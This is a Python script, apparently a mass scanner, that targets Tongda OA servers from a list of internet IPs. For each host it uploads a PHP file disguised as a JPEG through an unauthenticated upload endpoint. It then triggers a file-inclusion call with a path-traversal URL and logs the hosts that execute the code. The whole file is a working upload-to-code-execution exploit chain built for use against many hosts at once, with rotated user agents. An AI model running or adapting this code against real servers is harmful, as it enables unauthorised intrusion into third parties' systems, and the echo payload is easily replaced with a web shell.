import time
import os
import aiohttp
import asyncio
from aiomultiprocess import Pool
from random import choice

pic = """
 (                      )                       
 )\ )            )   ( /(  (                    
(()/(  (      ( /(   )\()) )\         ) (       
 /(_))))\  (  )\()) ((_)((((_)(    ( /( )\  (   
(_))_/((_) )\((_)\    ((_)\ _ )\   )(_)|(_) )\  
| |_(_))( ((_) |(_)  / _ (_)_\(_) ((_)_ (_)((_) 
| __| || / _|| / /  | (_) / _ \   / _` || / _ \ 
|_|  \_,_\__||_\_\   \___/_/ \_\  \__,_||_\___/ 
By Nick Yan
"""

proxy = "http://127.0.0.1:8080"

USER_AGENT = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10",
]

# 已经通过 fofa 获取的 tongda oa IP 列表
file = open("tongda.txt", "r")
IPS = file.readlines()
file.close()

# 上传的接口、tongda oa 默认存放上传文件的目录、文件包含的触发点
target_uri = "/ispirit/im/upload.php"
target_uri_2 = "/general/../../attach/im"
target_uri_3 = "/ispirit/interface/gateway.php"


async def upload(IP):
    """
    首先对目标进行文件上传
    """
    headers = {
        "User-Agent": choice(USER_AGENT),
        "Content-Type": "multipart/form-data; boundary=---------------------------19520547671076793750827862981",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
    }
    cookies = {}
    check_url = f"http://{IP}{target_uri}"
    payload = '''
-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="P"

1
-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="MSG_CATE"

file
-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="UPLOAD_MODE"

1
-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="DEST_UID"

1
-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="ATTACHMENT"; filename="vul.jpg"
Content-Type: image/jpeg

<?php echo "flag: Vulnerable.";?>

-----------------------------19520547671076793750827862981--
        '''
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url=check_url, headers=headers, data=payload, cookies=cookies,
                                    timeout=10, proxy=proxy, verify_ssl=False, allow_redirects=False) as resp:
                print(f"[*] Now upload file to {IP}")

                if not resp:
                    print(f"[-] Upload failed...   1")
                    return False

                # json_data = await resp.json(content_type="text/html")
                resp_data = await resp.text()
                if resp.status == 200 and ("vul.jpg" in resp_data):
                    # print(f"[+] Upload successfully on {IP} !")

                    path_data = resp_data[resp_data.find("@")+1:resp_data.rfind("|")].replace("_", "/").replace("|", ".")
                    fi_path = f"{target_uri_2}/{path_data}"
                    # print(f"[+] Now include {fi_path}")
                    return fi_path

                else:
                    return False

        except Exception as e:
            print(e)
            return False


async def fi(IP, fi_path):
    """
    若文件上传成功，则对默认上传路径下的文件进行包含，看是否有回显。
    IP: 目标 IP
    fi_path: 上传成功后获取到的文件路径
    """
    if not fi_path:
        return False

    headers = {
        "User-Agent": choice(USER_AGENT),
    }
    cookies = {}
    payload_2 = {
        "json": "{}",
        "url": f"{fi_path}",
    }
    check_url_2 = f"http://{IP}{target_uri_3}"
    async with aiohttp.ClientSession() as session_2:
        try:
            async with session_2.post(url=check_url_2, headers=headers, data=payload_2, cookies=cookies, proxy=proxy,
                                      verify_ssl=False, timeout=5) as resp_2:

                if not resp_2:
                    print("无响应包")
                    return False
                if resp_2.status != 200 or not await resp_2.text():
                    print("[-] 访问失败")
                    return False

                fi_text = await resp_2.text()
                if "Vulnerable" in fi_text:
                    print(f"[+] {IP} is Vulnerable.")
                    return IP

        except Exception as e:
            print(e)
            return False


async def do(IP):
    IP = IP.strip()
    return await fi(IP, await upload(IP))


async def fuck_oa():
    """
    设定进程池
    """
    async with Pool(os.cpu_count()) as pool:
        result = await pool.map(do, IPS)
        if result:
            return result


if __name__ == "__main__":
    print(pic)
    task = asyncio.ensure_future(fuck_oa())
    loop = asyncio.get_event_loop()
    start_time = time.time()
    loop.run_until_complete(task)
    vul_ips = task.result()
    with open("Vul.txt", "w") as f_2:
        for ip in vul_ips:
            if ip:
                f_2.write(f"{ip}\n")
    end_time = time.time()
    print("[+] Task completely.")
    print(f"It costs {end_time - start_time}s")
